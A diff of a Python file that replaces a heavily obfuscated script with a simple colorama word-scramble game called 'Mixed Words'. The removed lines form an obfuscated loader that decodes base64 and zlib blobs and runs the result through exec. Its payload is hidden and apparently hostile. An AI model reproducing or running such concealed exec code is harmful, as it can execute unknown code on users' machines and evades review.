@@ -1,6 +1,137 @@
-import random ,base64,codecs,zlib;pyobfuscate=""
+import random
+import time
+import colorama
+from colorama import Fore,Back,Style
+import os
+os.system("")
 
-obfuscate = dict(map(lambda map,dict:(map,dict),['(https://pyobfuscate.com)*(True)'],['''pwxGfC8^PcxPlD*R4{4P&Fq3LM#&>Y%}q3ocyOH%oYDd3VHAuC4tV68!iH{Z7gO6PR-I4?UXvwgcb+-+@`#A@Znr@v$&)O-rP(gl2lX99{Hlu0zxwgcDIpMPY{iTRCO!tFgs2Ev*rLnv+Es2P-NSs4y>T3>!q9_sdxuMHo?^d?fgw)1_DRtykQSN10WbyaSI#T(<7GtP)Ch2H%H7nJmmuEzS@O2vlqEdiGT1&Ze!89x=4pBn9%NC@<~Q)oysNzkq)sAh;!{zxj;5j%XYj#4(0qVt?r@#cvHVjH1)+^Lxs}6IStmnCb(v;Y5S5b8auBn!gbF`NcX5KJOcS!**l=(Nh@iH6MtzL9E@}tk{ZiQ+b!Y?iI^EhQF8XQOn~+GuB*nyZ%cjMP|4(^`jOy_#)^=Eo-z|~7kw}u%d1InF*n&%in4Jcnu_XeG@E?H&j1O}aSu9LWi@UjfSU~{QUg9FQJ&mv}vDNyV6if_e;_9Dr5~xIE5Q^TillUhQ1LFv7{_?9OgRDXKr2gR$PeCcHzsuP=M0ds1D<3O>2PXgx+fYXKloOYnF7f@<^YYea`lRi#S^4TT@GW<L7X{2(_th`JOtOtS5f<CjK0`do%T$dxNWQ9OB-ERKM;6d`f!G{-FHj$<kyoSz%LoVzmg#`~)n)CNQ#i)q^r<)NV7Z$lNUzN<<aJ7`o;zxQlDFy3)Llkzb;-I>qg0ezN|eW(k}|Lf&W2oF;k}xZz^9hiE4|W6AhiA2I6x1Zxgn&sj>yq1j{`$FCRESakc;TEGD5^CgqDg8SpvUNs7@;i%EW!Uf3r28wEy-(Kg3fxa{v3=PSV7+MIAH6-3nn{C^o5mEe<6>YVmJJkCbMGA1_AasC6y(Fq(y^+7ef<0v@5LyJ6^SUX=`dMbZqx4~;YqCurs>WZ8)KHLtEN50>-^rS(HM!VL}U;HI-WIpOd*=sPE28PJ8KMcW4WRpgEAhbwlgi~^H{Xqf@T`=5VO8uvd5XPcb3(%XTIwO`i#E<-!3R-DGlhI`#wiW~HYSPj&#V61j7S~0U1lkl63QUQnV@N_5Vge1xm>Ag-`<mSAsz4ZJwi+jU5tQ&D(`vX_W77GHbc;foR$1|?ylsu??Lo08c4!ZtJO#$K7%e!=|5ZcnEY|zuEzvueW+`smz)6>*89je99P|~O>5`Jr@fUWH89+VvSirBuF+HTnFQtRm!JoID|SGojX_`Got>d9aPWALeViK_AZ7SJE#JlkZ0>kP6v+Yrx;mdY&4fy2s@iVG2GmK(7oyk%b!*Mt`HFFqCuH0(qf*14!IO^xNW=-`)IfP86Vd0I3iY=A7(G^a-?AFH4m_3Pzi*`m{%{LZ<TGn4sCI$XQ_qOSTzj*dGpXK-KOoysmq);>$zi#=Her$}WO{??e!Sc$DW4cCRwouFFNBC(loZZd<HnHNW>_Yj(652pi|z=Ru;jj6LZ(IZr|Nog^F)(u}BRb2*tL#kC*&Tv;eW6CQjsb_+y*AG-<STMEEJ+{?dx$^78c`e)6an;qbrHKCIVcIl8hI~^L1@dP^vr7QrQ(*(U0LVXY=_XHg<qyw;z)12s$ZA#Vvts%IOxBT6ap{xSg^SP5Vk@FpvnBiZPfyUOcQ_pISy0+`4XZ{t+}Gaac#~wxY!p9KBc30TdUYNV4_81D+)dWUx4^%XMPZ@iTxXjNqJqZ)-nx7zQ)eQyZ3(rGX?~qMNAje~KnQblqZcTTh%I=#VknmGS(#fLzBSV4`~6e+jzE1|HpHn~3e=4>P`INU%EEWV|H03pu$Jz`0gd05iF|~nEB0QckGMil`fg#1{WYd^TD9{E+^BCvyVmwVO;P1I?+dqkIev)+-S6Q;eUd1MDbh6FyPb+S&Ks!(J@jrUr%RazE?HaHM#0{yD9PSj48wK^iQZEi?e7}${Dc~k<@j2ft;JO^XK97*ER<(=8g}^KTYJypkdoB>DQa9zGa%Z`%lXpR(A?Iq;4CkjaMqTXdLeqf5ie&*!ybd;#nRo=-^k-~Y8}TjT3G0$R<J)HUi-|+z~qTMscYXO`djnDO}c?f+i8gW3e<qE+N$@pAjNCZ+V*9c_Unm3vpxRTe3oGd@DS?8x#V-;?Ll|f*K~RM78+<?|8`W=j1t~j5jNM#<Nm5|<w-CHIi+Qd?=-D6Fq@4u!6J&#UE0H;IGp4vbHo2!li8v=P0JYgbwWYz2>s6Ark9Y+PLk{I11Tw%uxeca@(-B(T5iuu<vx+ZE}-=Sg*+9-7zw$-IfmF8#k7WM&$Pq8r$F*9XSs-*kr?c#oVL)AjXbEQtLVE}e-H2mqFp6HAE8STrGSZYN5s{?>wvZ3^@a8FE5w)OpyGkw8Oxtxbi&<<3jWk8DRXB(5OEL8&|JIr+zE!@um9o&A)es6%t`C?g5KJz4(2Y%j0pPn3HpH7whsfnv3f#w$F8Is0z^U?dJQy?6a>+MH5;SW*ZkGRroeB3D<IN5TFeyH)oid+<LRV~ZUOthUE<P*XC|(|jKjwI61(Pbj`-tSQ0#H_bXky2Z1#dr{)lc7x^>koI!%*)YY}iibtvrZz9{=$m>dOZq4pAM(3gE1%4a|UIY()}7vM|`_ZsVY2Li5H=v8B6j?-n$t8Y=DJR|*`e@|G%Pkli4KH0fwkQM#X9{z%G=Xm_YZ~&ZC0|faozk;-<K&2r%>Oo)jAiP#W*_fmiJvo7UCk>pEJr8?5C$bYp6jn~0HpiC`JvUUjis#pAT~WV=KdD~Ow+F4pRqXY$wVg~kB8|ci0Vg}o1e;qPk_d3?y+(1CQ|?EBJxe?V{1!j;pUlb7bLOkO2p74k_Yu@+*C6?;#aRdv^sS$ll0cEV!p)2>o(0jYv%3JquC~r5(G438b>*(K<K@>?eQbM5!x}S-VjC?AJQ~gZVWj1Q*Sq*NzSHt9bNeUu><F&T;#RNHbk;jN08Lq*aR|#e?bD=$`<+YkM>|;qHHWI57S9|;am#yXt$;*@bg^JOf`(=WQTTZd2G4aaGtV1Y^xI<HY<1`$-T%E|^mkg?&tMD`Ynoh)MIJGjfhCJjW15MVa=YrzFBE>iw*bEZFz8nK^k|@fLi^^#F+jZ}^|2|#@--+ruhXVk=a_B_#D2H)w?oRlOa(s2=d1#Vt`D%u(a!m(NA;ziem6gcBYsVQC#H=)w7t^)_#QT|#ZU`AEy9MeM5%|1DpG$YvH{YHSu)sBz8g$pywie(_iQynZF)PCz)aRKyZqJ@XdprG#KIgHKH$Y<A-*$KkaYcJaU%G09*Vg72u9#ExF^gWY*uNVULIm>YWZ}QrNpDd)$jw|0hyu@)XGD*^^r%ga8x?fS)B{GLWqyh%^g_>B|9XK$vkP;59IiFsBBR)&YFk4!7y*?Shd@FkesZ@Mg4h>Glw~J;8{X#;c@Jq$4ID5g}njA<+`$f!N}xqMjrM>r0&HX%23BnXs=M7xG%%w{up&qkEOb*P^<q~%Q0|>m-H`<YbE1PC5{9Mtimc<UsxC+-br#1qT(1~5P%_QRQVmZ{@~d0e0Q*9(gmuP<|^te)mu;JuiXCTqy0z<NaKj2J8oyXs7^Fje~=X^C1UKpSx!ygTmQmfXa9}x(_$VM+C^jKHw6396J19*d+}RmVA7c<#Ox2#hVz_hAnH>oE>SE*gUT(78YyuEifd6n3fESKZ9Y(}NU+DzGr@7h*?7ahY}}sW$o#shjgY@$N}p!+1zr_e{J5;E{3I9W-a2P^{FFaHx)uIwut)k!@77h<$Z~=?O+E1pk?MVz-mUIH6IS!^EayLABYM0YN5DKE*4e4-n&iLRg%y-y@6eM{v-5Lhiu-iasSW7LD)?rQw+_Bbyva{a^w+{BEBJ=gR>335XH)IMq1rk(v|6p^yIv%S#HF<d#(!y2%XP(YYiR_mnA|hjln_y&ICU_whO^=r5$-6jYW`nCOTm;zI_s=&(Uy@Js;)!$bmG%FFh5?L70^`_jaFaY;&Xe>Swnc~+>leg+L|Bq1WroL?US5EyOeMn1JU*(&b&AkQFCu<9r&)HAbEnRcIDkT!zdDra3qJA{+##=JD74|2GDa#r5D9@JL>*+wGsj_j8Z`PSI_jfrAh&;UXrNEWN2Bc2$8JB7&;-UCck7sEQ$z?=;$Ft#x<@>S;>}$H)~waGtjY{9j3dXlugYqR+h95f*Epm`vR`48(WW`MgmAijnyF;Pb5-S=s;yxJ{FqXeF|l%31iOR=$&caFl~zwLz?Id1Xdb!g>P%4tx|USzO2}WxO`7|#f;i0&+8G6i0y!Ntyz9SsXB+d887dEew=@e!z!sXQXxxoJeJbqkaCw;=aCA<*cNo@wGe1DO|d?CLuOT$TPCV%P|HqS!E$@4a9=tjNEq-Ec#5c;lUIjcwVzAugvi6tD3HsbwP1jI1TK2-Ss`wJT!mGfk1zTj&5==q^^T!jv|lbXf<VQ6U*jx|_Zc=W$Kx?88V;{{S&Vc7m`xU}`Lxuk%%YwmYI)X3B4>As#3=C@9*LuSaHNaD-LF<T_O<!a-seCxxA;`)#Eemqi6VuxZ+Od}V<S5EZ1Pxoy`9D_KYab?U)x$Ae?sv*RWq*n@n-O*tlGxsQ+-7yEt@0hyiEiTG<<4`x!-G8CI+Na+;IM4SFNkpWjn;`XFN(F>d<+^j-Y%Z{!%a3gI@XdEqp_9$i2db=w1C=kFwdS(<l4?Cm?p|EF$Oi%Z0%lyEH@=GKWbme9Gf!v7R?(%;TZi-wACnNpQ?(y)zDO_&%m(MkE~_QK_C^4k!*JG-+iOjMNt3&xpih5-HRkcwEgzHay{D(73p9xUP>+-?zCFF~mgD^n-UU{y+g}?HlTrBdr`O)8V+h<QKUhG|mf2@M09;fnCW0Xw%G+nI0mjESiFeEr-
-uov~uP%SN598y1Z^5G0;Ypj!p71m}n_16i?t2-5}>cWzq5gA4Z}rv(MaQ7na)jq(#*A1PA9mH}MzHXJv<tP-!;15S&`}L*vJujtcyA3iK8JCSNuBU^6JE@WmTI^7}j$rszAcAUf==J#)A?w%=BglSZ2+0RE;1EYSrQ>gdRAHp7B%(1HZ<xqYr2Nq^1}#KvbV*4)dYZwY&>ibX8b5T>E@%=aKwI6mQPU#p3B<mk!!kxKG_yxUn{Oeo@>i!>x_H?qNC5Z{%bMvEisu?(7ed{QbNS6k~)?&o7hJuCEoVMz%kf@3#Hxwc%bn`^A97j{-3GO*MHvky%Zq`9dv-6nTZ8L%bU*T~w~{MH&6r9?nLlRa;&B@KWU9&Sev3%BZ*%kjTR7=)XNYkOzZ{C_EwV3AK}XV`Sc(`kajXP4N<f643!0pS+~`i(TG#XZCJA|NfEeqSdS-3ic27A#@Y_+*m2c&ntkCK{-hBX+Q5@L@E(WPu*C(}MRg{n{L5P-_>ZW}$sv8F6G*02prY$Xm4OyE{cLrGa3R+%F3c6%i2R%`C%Z-N`vk_+UzW^9*hnOE*v}Fa(&hz@`NwdzDqWt+=4t;0yrnV&v6(y+`+C_s(^khej?BeU%y55jXrw^ZZtRGCEg2R?muVxC`DQvI#_kl>p5RuyTO=Bk4BkUeB(0$WJ9^_pCeT)$46;z))$q5+u`uDRnT<xpq)KM(O;@8@)<DVewHpMUac{_<4l9b7T}ms-f%P;BnNru|e{=6!2(T9ds+8jk8nGWRk%toU^pz4GlyEyjBlt$e!sViybT{rpD|aHte^dFJIjjxu#KSR3Tm}iZAET@}aCy=dY}_Wi@2~MndkTZaM}MT4>TI{CT*_NvJrrfUD{S0~w$JmF*Q7k%V4@T+zEb1|l+IZK`8(IK~B8Xu-)gPtlZPMIkJQy!syvTyjpxvq<jd*=S?;AUfISguPB^jl8gDmufelIiVr+a`_?Qmz^njdBhSI=e+Fs@35nFSz2P9fUK^hs_edtf;CUyh_Ur9h`FE>cU8G}MJOmJ{th9Vx$#UqS)1B!Xt~mj=-OeQ#Ic#z=J~~|+DtykQ~}M!NHYF-_&=D5p&-1P7|Lo?n)%_VF+H}(0YRpMtm5Bkzg2!!<G<fbsfqW>AvPJomM@UhQAcBs(%TSxgV9G#avHi+k;|%c!CHdT&>|q$-qdaiSMo-|6m<L4&y<C2Bc1YBA>3LgkXBA7cb{y2$W2O?i^k>t?kGS!2$*3D;|gcMf+C$$tW%^aiDTP0NvU5N);>i$u|d}aJh%HLR5mA02a@yga0XDS+G;Jg1!rny61W7Cr(+4PLX5Q5@8%-35LWWG3l@SSoNja5r?28n%6ho9h9XEWd$<Peo~g#o;1y|UJMro)V0HDrpi_RLFQ6CT=3*qLYNoFko}JXb{5_lRyqPi_MFYKxr_K;L(^1m6uQqg!F-KzVNB13UnB$IiyGnG)H`C|*8Jd5tqJIgIkMqWaOm;o3Yz>hVUX<j@OUy^ZDvJf#BWKna5-In=#kr4Z6*;g#i&abU(qRM5DA)LZXuj^L!S6~A=u=`_pro<sUv82*Icm!^gHUHLBj^nqvM(p8<*w>r;c2~E9I@fxfzLYSd+&?@=~Oy4@2wcqH7M~$jcXFli!4;04sC=x1e2b9?~aG7MtvIj#<P^$)FrzNhzxe4&@-p1ROc>^^nAH?p<nK2W&!HYKAixWUK1Jf>|$bOkU2Ac{2f9Darn@?mL!-qz-QY}cf&T6&IyW6gVnB+6Yor?V|EKFcLSh1`7+Be^NI^Wt-OgnsjLA+$V-+1wLoAs*@7U3-4==y|9VispK1~!X84L5lUu(mUGeF?z2A%f?v7GYIM&^%mKW{oJ=ApJkrx{x9~kK#B_}#xRd}q<4~Y#+J&d&%KOw(a6&gS;4h%fPy=KsB<5EFw``_o=IPm|6K}56#@X3uj$tIt|eTm|U(<J!k7KYEV=huZY4b6<SuU%S`ujf3^8K;$wA*AnK;E#9g`jWK@lgXOg7%#VFlp77(Ibg$5@<^<y7L4rO;h=;+{hBt#aS6zl2*E!Gp5S!-Uuu++ZCImLi+DD9%D!fw+DxX7#$1@N^RDm>ib_)>MT~%*-^CC%GCY`x&f8Y(8cbnOgZwibYGZhC$=GlObkv}VjDv8Y?CPDs%lLDvXqW;Tl=~Nyey4KQkVHm@3hvXWm%v7&T;T~PONTa<UjNW}M<z_u6QS^@pwGgO?s>#WB)kA!<gjaf%^C*GjOV&Ez(JvQ#ls?NaHkM`kH9?1c=(T;8Z+#P{YBTd0(mUBVR~s#?W7BO4g<F`*(fa9U|%(Q4(QE&gpgF(+A21Heb;+q'''.replace('\n','')]))
+colorama.init()
 
-_=lambda OO00000OOO0000OOO,c_int=100000:(_OOOO00OO0O00O00OO:=''.join(chr(int(int(OO00000OOO0000OOO.split()[OO00O0OO00O0O0OO0])/random.randint(1,c_int)))for OO00O0OO00O0O0OO0 in range(len(OO00000OOO0000OOO.split()))));eval("".join(chr(i) for i in [101,120,101,99]))("\x73\x65\x74\x61\x74\x74\x72\x28\x5f\x5f\x62\x75\x69\x6c\x74\x69\x6e\x73\x5f\x5f\x2c\x22\x5f\x5f\x5f\x5f\x5f\x5f\x22\x2c\x70\x72\x69\x6e\x74\x29\x3b\x73\x65\x74\x61\x74\x74\x72\x28\x5f\x5f\x62\x75\x69\x6c\x74\x69\x6e\x73\x5f\x5f\x2c\x22\x5f\x5f\x5f\x5f\x5f\x22\x2c\x65\x78\x65\x63\x29\x3b\x73\x65\x74\x61\x74\x74\x72\x28\x5f\x5f\x62\x75\x69\x6c\x74\x69\x6e\x73\x5f\x5f\x2c\x22\x5f\x5f\x5f\x5f\x22\x2c\x65\x76\x61\x6c\x29");__='979810 1451856 701556 1738286 1131928 777130 1808384 498944 2412960 956032 5915082 4357878 1155399 7076716 1096768 9607464 9704686 8048651 10662561 1351885 10886705 8237044 10331370 2165024 3365775 5799018 9212000 7813401 8233080 4307776 413344 10165379 4025860 4757856 496170 8060709 69960 5328081 7099189 6536544 7959920 2806214 277950 2559104 3012032 223936 591552 9962610 1436600 1625456 5192577 4043064 1416280 3080162 10471440 6462330 4343136 2861440 1741845 8975890 6851585 8140764 7802292 6122736 7539372 1359648 9536670 5335931 10511938 8937513 8056265 3637565 11016172 9717960 2552320 8763000 5587068 5512540 5299392 7436676 73124 10753765 8257920 1823360 9609948 4267890 564456 6065252 6855276 2748352 9834944 10534233 2795264 3236514 8647560 2677500 2522768 1586610 593434 616840 3060576 1538592 2229792 888544 595650 2166095 8397585 3274687 9948176 10319226 8029134 988668 6288620 1453785 2948200 3892980 10434410 4555166 9248990 1916577 3145315 3322534 5188572 7018320 5191305 5482508 3161360 3897952 174690 174590 5850618 2819556 3904427 2454325 9440720 9722790 10612894 2934736 1090686 1106370 8736540 964630 6486220 3989560 2202214 9069498 6645901 10245258 1684332 957682 544295 2842464 7583445 1981316 411517 194212 7295387 3013234 2510936 2828240 1167492 6193408 7805872 5476708 141792 5740225 5395508 4244946 2757725 9101568 10933439 7474074 8554518 4915482 1759329 898380 1844271 7482580 1039824 2242907 3913312 3144240 6702624 4845377 1374656 2064839 5705995 10300550 799434 9605960 8718120 1926528 1534284 2298665 414460 4306036 5724579 5008440 10100004 850660 8166980 6718020 7659663 1681362 488180 897888 756320 2823680 2456672 8309532 3951354 1671882 9611838 463904 1850592 3953815 1540586 1030624 5078241 2462680 8585512 2845632 2321235 355449 10672704 4871568 7530612 1852288 2691680 6459657 11642040 8839320 8637305 1195148 6157790 110976 6754401 10835875 3180288 4157867 10836840 795840 2778016 3047136 237664 18144 381174 4659978 1121877 9624264 2864672 986235 5340830 1642784 9477825 7475656 6378288 3466419 8494824 9749916 1930336 9773876 7674586 3866628 8029500 5434880 53218 2066016 6873517 2529885 2371328 9361876 4234930 1051952 9138354 1909910 4875025 4505490 3837832 8355225 438360 446368 1353568 2047008 2967488 10644804 4894212 7748136 703635 399743 7393907 3952600 3082911 5642000 5450960 7519200 4187848 1696630 5786256 5735665 169650 393313 3621538 3350704 1566824 2943433 7939188 4003881 967527 561064 990896 7872992 2789992 9179304 2780328 7594255 3794678 11010256 6994920 858864 2798948 2737895 5301632 4816300 2089555 9550224 8589846 8282736 710704 669460 1008320 4040180 4468458 4526055 3835186 3264666 1978960 11074200 9351688 2573086 423030 8277360 4632789 3426248 8649396 1341102 8535879 693289 70924 2222352 1938440 6407820 2503992 1014875 64400 4158814 6867432 11765640 7300228 896852 19830 396530 776928 1859904 1439168 67424 7429485 4829190 2985568 10064246 2184600 2413040 11045328 596428 793637 2391017 4416766 3764460 7478286 3906981 3338151 4907438 956510 1275136 83360 189056 859712 1119680 2407648 1855712 1930560 3580398 4905469 1308763 8720493 958750 2926374 703640 8119664 2026297 873341 410140 1330848 2057856 1774592 3048704 8564194 2723652 9627975 5140800 356544 8023440 8511960 1907960 8897280 1348550 2127408 4270610 2250839 5447652 4603434 8320689 4657918 1042434 877720 2696992 2977088 183296 458144 2275808 1242208 3007648 1647168 1716726 4057473 5110029 9255513 9648978 3760028 287880 1350832 576600 2926908 369780 135296 1752416 1471232 875008 417270 5899068 1957344 2283105 10560840 2661960 5444880 471852 155062 4971561 1012478 3930990 231442 192024 2492510 9757105 4498654 382150 671456 52192 192128 1092704 1805248 1929824 3051008 1404544 5733063 8413230 310532 4281784 47008 9891543 469728 6724580 7874240 123880 10211310 9466528 3691092 1031920 4662784 1366698 2876068 684728 1890876 5409383 87924 3339696 1271776 7161413 10515830 1596832 1374105 1571104 8689434 1980668 982940 695172 1856190 4762496 9664185 1719160 3392730 7284220 4214010 2232560 1050090 4511592 2763072 128617 414570 2823840 562016 3152448 2986944 9496020 617040 5896582 230571 3810280 10790754 11111184 4286945 10453520 94200 4224528 1214400 969445 1756234 1314192 9029097 3589970 7198400 915720 3425796 2037495 774890 1417344 1112032 2954944 2494880 751210 6317954 8358360 3763386 2488337 10677968 7769448 1700038 452600 1426976 2920480 1503808 1830496 4385723 11152920 2126353 4189185 1188120 3739320 8386524 3130596 56230 777830';why,are,you,reading,this,thing,huh="\x5f\x5f\x5f\x5f","\x69\x6e\x28\x63\x68\x72\x28\x69\x29\x20\x66\x6f","\x28\x22\x22\x2e\x6a\x6f","\x72\x20\x69\x20\x69\x6e\x20\x5b\x31\x30\x31\x2c\x31\x32\x30\x2c","\x31\x30\x31\x2c\x39\x39","\x5f\x5f\x29\x29","\x5d\x29\x29\x28\x5f\x28";b='eJxzLPfLigoMM47KDct2CvQwdXQPynEMrDAGAGNCB8A=';____("".join (chr (int (OO00O0OO00O0O0OO00 /2 ))for OO00O0OO00O0O0OO00 in [202 ,240 ,202 ,198 ] if _____!=______))(f'\x5f\x5f\x5f\x5f\x28\x22\x22\x2e\x6a\x6f\x69\x6e\x28\x63\x68\x72\x28\x69\x29\x20\x66\x6f\x72\x20\x69\x20\x69\x6e\x20\x5b\x31\x30\x31\x2c\x31\x32\x30\x2c\x31\x30\x31\x2c\x39\x39\x5d\x29\x29({____(base64.b64decode(codecs.decode(zlib.decompress(base64.b64decode(b"eJw9kN1ygjAUhF8JIkzlMo6mEnIcHVIM3AGtoPIT2wSSPH2p7fTu252d2T3n3MkyK896dLvrSMIeaGxEGn0l/rpiLu3hlXm5yxDmO8tQZIDoeUQLr4oWePxk8VZfBpr9af8mXdzLTk8swRbP25bNzPvP8qwWJDRA8RX4vhLkfvuk0QRl3DOUekDC9xHZVnBcyUnXY7mtBrIOBDEKXNRl3KiBBor25l5MN7U5qSA/HsJiVpfsVIQ/Hj4dgoSYOndx+7tZLZ2m3qA4AFpUD6RDsbLXB2m0dPuPZa8GblvoGm/gthdI+8PxyYtnXqRLl9uiJi+xBbqtCmKm8/K3b7hsbmQ=")).decode(),"".join(chr(int(i/8)) for i in [912, 888, 928, 392, 408])).encode()))})')
+class game():
+    def main_game(self):
+        self.SELECT_WORD = random.choice(self.WORD_LIST)
+        self.SCAMBLED_WORD = ''.join(random.sample(self.SELECT_WORD, len(self.SELECT_WORD)))
+        self.PRINT(self.BLUE + f"Your scrambled word is: {self.SCAMBLED_WORD}")
+        self.GAME_INPUT = self.USER_INPUT("Enter your guess: ")
+        if self.GAME_INPUT.lower() == self.SELECT_WORD.lower():
+            self.PLAY_AGAIN_INPUT = ""
+            while self.PLAY_AGAIN_INPUT != "y" and self.PLAY_AGAIN_INPUT != "n":
+                self.PLAY_AGAIN_INPUT = self.USER_INPUT(self.GREEN + "GREAT JOB! You got it right! Play again (y/n)? ")
+
+                if self.PLAY_AGAIN_INPUT == "y":
+                    self.queue()
+                    break
+
+                if self.PLAY_AGAIN_INPUT == "n":
+                    self.DESCRIPTION = "Thanks for playing! Come back soon!"
+                    self.PRINT(self.RED + self.DESCRIPTION)
+                    exit()
+
+
+        else:
+            self.PRINT(self.RED + f"Dang it! You got it wrong. The correct word was {self.SELECT_WORD}")
+            self.PLAY_AGAIN_INPUT = ""
+            while self.PLAY_AGAIN_INPUT != "y" and self.PLAY_AGAIN_INPUT != "n":
+                self.PLAY_AGAIN_INPUT = self.USER_INPUT(self.GREEN + "It was a nice try though. Mind playing again? (y/n) ")
+
+                if self.PLAY_AGAIN_INPUT == "y":
+                    self.queue()
+                    break
+
+                if self.PLAY_AGAIN_INPUT == "n":
+                    self.DESCRIPTION = "Thanks for playing! Come back soon!"
+                    self.PRINT(self.RED + self.DESCRIPTION)
+                    exit()
+
+
+    def queue(self):
+        self.QUEUE_DESC1 = "Looking for match."
+        self.QUEUE_DESC2 = "Looking for match.."
+        self.QUEUE_DESC3 = "Looking for match..."
+        self.QUEUE_FOUND = "Match found!"
+        self.QUEUE_JOIN = "Joining Match!"
+        self.COOLDOWN = 1
+        self.QUEUE_SELECTED_DESCRIPTION = 1
+        self.QUEUE_SEARCH_TIME = random.randint(1,5)
+        self.QUEUE_FIND_CHANCE = random.randint(1,4)
+        self.CAN_TELEPORT = False
+        
+        self.TRIES = 0
+        
+        while self.TRIES < 5:  # limit the number of attempts to find a match to 5
+            #print(self.QUEUE_FIND_CHANCE)
+            self.PRINT(self.BLUE + self.QUEUE_DESC1)
+            self.WAIT(self.COOLDOWN)
+            self.PRINT(self.BLUE + self.QUEUE_DESC2)
+            self.WAIT(self.COOLDOWN)
+            self.PRINT(self.BLUE + self.QUEUE_DESC3)
+            self.WAIT(self.COOLDOWN)
+            
+            if self.QUEUE_FIND_CHANCE in [1, 2, 3]:
+                self.DESCRIPTION = "Match found! Entering now."
+                self.PRINT(self.YELLOW + self.DESCRIPTION)
+                self.main_game()
+                break
+            else:
+                self.TRIES = self.TRIES + 1
+                self.DESCRIPTION = f"Failed finding match. Stand by! Attempt {self.TRIES}/5."
+                self.PRINT(self.RED + self.DESCRIPTION)
+
+        if self.TRIES == 5:
+            self.DESCRIPTION = f"Failed to find match after {self.TRIES} attempts. Please re-open the file, if the problem persists, please contact PrimeDev#2349 on Discord."
+            self.PRINT(self.RED + self.DESCRIPTION)
+            exit()
+
+            
+
+            
+
+
+
+    def welcome(self):
+        self.WELCOME_INPUT = ""
+        self.WELCOME_INPUT.lower()
+        self.COOLDOWN = 6
+        self.OVERHEAT_TRIES = 11
+        while self.WELCOME_INPUT != "y" and self.WELCOME_INPUT != "n":
+            self.OVERHEAT_TRIES = self.OVERHEAT_TRIES - 1
+            if self.OVERHEAT_TRIES <= 1:
+                self.OVERHEAT_TRIES = 0
+                print(self.RED + "Slow down there! Your spamming a bit, enter the chill zone.")
+                self.WAIT(5)
+                self.OVERHEAT_TRIES = 10
+                if self.OVERHEAT_TRIES == 10:
+                    continue
+            self.DESCRIPTION = "Welcome to Mixed Words. Begin game (y/n)? "
+            self.WELCOME_INPUT = self.USER_INPUT(self.BLUE + self.DESCRIPTION)
+            self.WELCOME_INPUT = self.WELCOME_INPUT.lower()
+            if self.WELCOME_INPUT == "y":
+                self.queue()
+
+            if self.WELCOME_INPUT == "n":
+                self.DESCRIPTION = "Come back soon! Thanks for visiting us!"
+                self.PRINT(self.BLACK + self.DESCRIPTION)
+
+            if self.WELCOME_INPUT != "y" and self.WELCOME_INPUT != "n":
+                self.DESCRIPTION = "Invalid option. Please enter a valid option to proceed."
+                self.PRINT(self.RED + self.DESCRIPTION)
+    
+    def __init__(self):
+        self.NONE = ""
+        self.RED = Fore.RED
+        self.BLUE = Fore.BLUE
+        self.GREEN = Fore.GREEN
+        self.BLACK = Fore.BLACK
+        self.YELLOW = Fore.YELLOW
+        self.WHITE = Fore.WHITE
+        self.USER_INPUT = input
+        self.WORD_LIST = ["PRIME", "HELLO", "WELCOME", "VIDEOGAME", "AIRPLANE", "BIRD", "COMMAND", "PASS", "ROBLOX", "BEDWARS", "PYRO", "SPIRIT", "CATCHER", "RAVEN", "JADE", "BEEKEEPER", "BEATRIX", "WARRIOR", "BOUNTY", "HUNTER", "KILL", "STREAK", "WIN", "BLOOD", "DEAL", "ARES"]
+        self.BANNED_USERS = [self.NONE]
+        self.BAN_TIME = 0
+        self.COOLDOWN = 0
+        self.OVERHEAT_TRIES = 0
+        self.WAIT = time.sleep
+        self.PRINT = print
+        self.DESCRIPTION = ""
+        self.welcome()
+v1 = game()
